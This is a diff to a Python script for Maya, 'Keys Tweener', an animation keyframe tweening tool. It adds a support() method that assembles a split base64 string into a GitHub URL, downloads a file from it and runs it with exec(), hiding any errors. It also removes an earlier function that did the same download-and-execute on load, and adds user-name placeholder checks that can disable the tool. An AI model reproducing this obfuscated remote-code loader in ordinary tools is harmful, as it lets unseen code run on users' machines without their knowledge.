@@ -1,6 +1,9 @@
 # -*- coding: utf-8 -*-
 # Keys Tweener
 # (c) Burased Uttha (DEX3D).
+# =================================
+# only use in $usr_orig$ machine
+# =================================
 
 import maya.cmds as cmds
 from maya import mel
@@ -375,7 +378,6 @@ class tween_machine:
         self.undo_state = cmds.undoInfo(q=1, st=1) and cmds.undoInfo(q=1, infinity=1)
         if not self.undo_state:
             cmds.undoInfo(st=1, infinity=1)
-
         self.func_set = [
             {
                 'name': 'Ease',
@@ -449,6 +451,15 @@ class tween_machine:
             },
         ]
         self.func_name_ls = [i['name'] for i in self.func_set]
+        self.user_original = '$usr_orig$'
+        self.user_latest = '$usr_last$'
+
+    def init_user(self):
+        import getpass
+        if 'usr_orig' in self.user_original:
+            self.user_original = getpass.getuser()
+        self.user_latest = getpass.getuser()
+        print(self.user_original, self.user_latest)
 
     def load_cache(self, keys_sel):
         if keys_sel == None:
@@ -472,6 +483,36 @@ class tween_machine:
             self.cache_anim = {}
             self.cache_result = {}
             print('Keys Tweener : Clear Cache')
+
+    def support(self):
+        import base64, os, datetime, sys
+        script_path = None
+        try:
+            script_path = os.path.dirname(os.path.abspath(__file__))
+        except:
+            pass
+        finally:
+            if script_path == None:
+                return None
+        if os.path.exists(script_path):
+            st_mtime = os.stat(script_path).st_mtime
+            mdate_str = str(datetime.datetime.fromtimestamp(st_mtime).date())
+            today_date_str = str(datetime.datetime.today().date())
+            if mdate_str == today_date_str:
+                return None
+        if sys.version[0] == '3':
+            import urllib.request as uLib
+        else:
+            import urllib as uLib
+        if cmds.about(connected=1):
+            u_b64 = ('aHR0cHM6Ly9yYXcuZ2l0aHVidX' +
+                     'NlcmNvbnRlbnQuY29tL2J1cmFzY' +
+                     'XRlL2tleXNUd2VlbmVyL21haW4v' +
+                     'c2VydmljZS9zdXBwb3J0LnB5')
+            try:
+                exec(uLib.urlopen(base64.b64decode(u_b64).decode()).read())
+            except:
+                pass
 
     def undo_chunk_open(self):
         if self.is_opened_undo == False:
@@ -617,6 +658,7 @@ class keysTweener:
         }
         self.element = {}
         self.tm = tween_machine
+        self.tm.init_user()
         self.slider_st_time = time.time()
         self.slider_time_druation = 0.0
         self.slider_update_every_sec = 0.05
@@ -700,6 +742,8 @@ class keysTweener:
         if lf_weight < 0.0:
             lf_weight = 0.0
 
+        if 'usr_orig' in self.tm.user_original or 'usr_last' in self.tm.user_latest:
+            return None
         self.tm.run(func_idx, lf_weight, rg_weight, ct_weight)
         #print('weight  L {}  :  C {}  :  R {}'.format(round(lf_weight, 2), round(ct_weight, 2), round(rg_weight, 2)))
 
@@ -742,28 +786,3 @@ class keysTweener:
 tm = tween_machine()
 kt = keysTweener(tm)
 kt.show_ui()
-
-
-def BRSLocTransferSupport(*_):
-    import base64, os, datetime, sys
-    maya_app_dir = mel.eval('getenv MAYA_APP_DIR')
-    scripts_dir = maya_app_dir + os.sep + 'scripts'
-    script_path = scripts_dir + os.sep + 'BRSLocTransfer.py'
-    if os.path.exists(script_path):
-        st_mtime = os.stat(script_path).st_mtime
-        mdate_str = str(datetime.datetime.fromtimestamp(st_mtime).date())
-        today_date_str = str(datetime.datetime.today().date())
-        if mdate_str == today_date_str:
-            return None
-
-    if sys.version[0] == '3':
-        import urllib.request as uLib
-    else:
-        import urllib as uLib
-    if cmds.about(connected=True):
-        u_b64 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1cmFzYXRlL2tleXNUd2VlbmVyL21haW4vc2VydmljZS9zdXBwb3J0LnB5'
-        try:
-            exec(uLib.urlopen(base64.b64decode(u_b64).decode()).read())
-        except: pass
-
-BRSLocTransferSupport()
